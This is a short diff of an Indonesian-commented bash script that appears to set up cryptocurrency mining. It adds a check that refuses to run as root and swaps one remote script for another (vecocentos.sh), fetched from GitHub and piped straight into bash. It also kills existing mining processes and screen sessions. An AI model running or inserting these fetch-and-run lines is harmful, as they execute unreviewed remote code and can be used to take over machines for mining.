@@ -1,6 +1,11 @@
 #!/bin/bash
 #!/bin/bash
 
+if [[ $EUID -eq 0 ]]; then
+  echo "Jalankan script ini sebagai user biasa, bukan root."
+  exit 1
+fi
+
 # Cek dan hapus folder 'vec' jika sudah ada
 if [ -d "$HOME/vec" ]; then
     echo "Folder 'vec' ditemukan. Menghapus..."
@@ -13,13 +18,14 @@ fi
 echo "Menjalankan skrip dari GitHub..."
 # curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/mbc.sh" | bash
 # curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/npm.sh" | bash
-sudo pkill screen
-curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/veco.sh" | bash
+# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/veco.sh" | bash
+curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/vecocentos.sh" | bash
 
-# Hentikan proses mining lama (jika ada)
-echo "Menghentikan proses mining yang berjalan sebelumnya (jika ada)..."
+# Hentikan proses lama (jika ada)
+echo "[INFO] Menghentikan proses mining lama..."
 pkill -f isu
 pkill -f SRBMiner-MULTI
+sudo pkill screen 2>/dev/null
 sleep 5
 
 ###############################################
